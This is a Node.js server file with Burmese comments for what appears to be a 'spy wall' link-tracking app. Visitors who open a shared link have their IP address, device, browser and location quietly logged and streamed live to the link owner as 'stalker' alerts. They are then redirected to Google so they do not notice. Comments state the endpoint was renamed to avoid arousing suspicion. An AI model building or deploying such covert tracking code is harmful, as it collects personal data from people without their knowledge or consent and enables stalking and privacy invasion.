const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const path = require('path');

// Static ဖိုင်များ (Frontend) ကို public ဖိုဒါထဲတွင် ထားရှိမည်
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// 🗂️ In-Memory Database (အသုံးပြုသူများနှင့် လာချောင်းသည့် Logs များ သိမ်းဆည်းရန်)
let activeWalls = {}; 
// ပုံစံ - { "maungmaung": { ownerSocketId: "...", logs: [] } }

// 🌐 Helper Function: User-Agent ကိုကြည့်ပြီး Device အမျိုးအစား ခွဲခြားခြင်း
function parseDevice(userAgent) {
    if (!userAgent) return "Unknown Device";
    if (userAgent.includes('iPhone')) return "Apple iPhone (iOS)";
    if (userAgent.includes('iPad')) return "Apple iPad (iPadOS)";
    if (userAgent.includes('Android')) return "Android Mobile Device";
    if (userAgent.includes('Windows')) return "Windows PC (Desktop)";
    if (userAgent.includes('Macintosh')) return "Apple Mac (macOS)";
    if (userAgent.includes('Linux')) return "Linux System";
    return "Generic Web Browser";
}

// 🌐 Helper Function: User-Agent ကိုကြည့်ပြီး Browser အမျိုးအစား ခွဲခြားခြင်း
function parseBrowser(userAgent) {
    if (!userAgent) return "Unknown Browser";
    if (userAgent.includes('FBAN') || userAgent.includes('FBAV')) return "Facebook In-App Browser";
    if (userAgent.includes('Instagram')) return "Instagram In-App Browser";
    if (userAgent.includes('Chrome')) return "Google Chrome";
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return "Apple Safari";
    if (userAgent.includes('Firefox')) return "Mozilla Firefox";
    if (userAgent.includes('Edge')) return "Microsoft Edge";
    return "Webview/Browser";
}

// 👁️ API Endpoint: သူငယ်ချင်းက Link ကို နှိပ်လိုက်သည့်အခါ Data လာဖမ်းမည့်နေရာ
// 🔄 ယခင်ကထက် ပိုမိုလုံခြုံစိတ်ချရပြီး သံသယကင်းစေရန် Endpoint နာမည်ပြောင်းလဲခြင်း
app.post('/api/vibecheck/:username', (req, res) => {
    const targetUser = req.params.username.toLowerCase();
    const wall = activeWalls[targetUser];

    if (!wall) {
        return res.status(404).json({ error: "Profile Vibe Not Found!" });
    }

    const userAgent = req.headers['user-agent'] || '';
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = (rawIp === '::1' || rawIp === '127.0.0.1') ? '103.25.140.0' : rawIp.split(',')[0]; 

    const logEntry = {
        id: Math.random().toString(36).substring(2, 9),
        timestamp: new Date().toLocaleTimeString(),
        device: parseDevice(userAgent),
        browser: parseBrowser(userAgent),
        ip: clientIp,
        location: req.body.location || "Analyzing via API..."
    };

    wall.logs.unshift(logEntry);

    if (wall.ownerSocketId) {
        io.to(wall.ownerSocketId).emit('stalkerDetected', logEntry);
    }

    // 🔄 ဒေတာသိမ်းပြီးပါက အလိုအလျောက် သာမန် Google (သို့မဟုတ်) အခြား Social Page သို့ လွှဲပြောင်းပေးမည်
    res.json({ status: "Vibe checked successfully", redirectUrl: "https://google.com" });
});
// Web Browser တွင် Refresh နှိပ်ပါက လမ်းကြောင်းမပျောက်စေရန် Catch-All Route
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 🔌 Socket.io: ပိုင်ရှင်၏ Dashboard နှင့် Real-time ချိတ်ဆက်မှု စီမံခြင်း
io.on('connection', (socket) => {
    
    // ၁။ ပိုင်ရှင်က သူ့ရဲ Spy Wall Dashboard ကို စတင်ဖွင့်လှစ်ခြင်း
    socket.on('registerOwner', (username) => {
        const targetUser = username.toLowerCase().trim();
        
        if (!activeWalls[targetUser]) {
            activeWalls[targetUser] = {
                ownerSocketId: socket.id,
                logs: []
            };
        } else {
            activeWalls[targetUser].ownerSocketId = socket.id;
        }

        // ရှိပြီးသား Logs အဟောင်းများကို ပိုင်ရှင်ထံ ပြန်ပို့ပေးခြင်း
        socket.emit('initLogs', activeWalls[targetUser].logs);
    });

    // ၂။ ပိုင်ရှင် လိုင်းပေါ်က ထွက်သွားပါက Socket ID ကို ဖျက်ခြင်း
    socket.on('disconnect', () => {
        for (let username in activeWalls) {
            if (activeWalls[username].ownerSocketId === socket.id) {
                activeWalls[username].ownerSocketId = null; // လိုင်းမရှိတော့ကြောင်း မှတ်သားခြင်း
                break;
            }
        }
    });
});

// Cloud Deployment နှင့် Localhost ပေါ်တွင် Dynamic မောင်းနှင်ရန် Port သတ်မှတ်ခြင်း
const PORT = process.env.PORT || 5000;
http.listen(PORT, () => console.log(`🚀 CyberStalker Core Radar Active on port ${PORT}`));